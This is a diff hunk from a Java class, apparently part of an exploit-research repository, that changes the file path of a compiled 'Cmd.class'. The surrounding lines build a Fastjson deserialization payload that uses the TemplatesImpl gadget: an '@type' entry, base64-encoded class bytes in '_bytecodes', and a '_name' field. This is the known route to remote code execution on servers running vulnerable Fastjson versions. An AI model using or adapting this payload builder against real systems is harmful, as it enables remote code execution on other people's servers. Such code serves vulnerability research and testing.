@@ -19,7 +19,7 @@ public class FastjsonSerialize {
         try {
             StringBuilder stringBuilder = new StringBuilder();
             stringBuilder.append("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",");
-            String base64Class = new BASE64Encoder().encode(FileToByteArrayUtil.readCallbackRuntimeClassBytes("target/classes/com/xyh/fastjson/Cmd.class"));
+            String base64Class = new BASE64Encoder().encode(FileToByteArrayUtil.readCallbackRuntimeClassBytes("com/threedr3am/bug/fastjson/Cmd.class"));
             base64Class = base64Class.replaceAll("\\r\\n","");
             stringBuilder.append("\"_bytecodes\":[\""+base64Class+"\"],");
             stringBuilder.append("\"_name\":\"a.b\",");
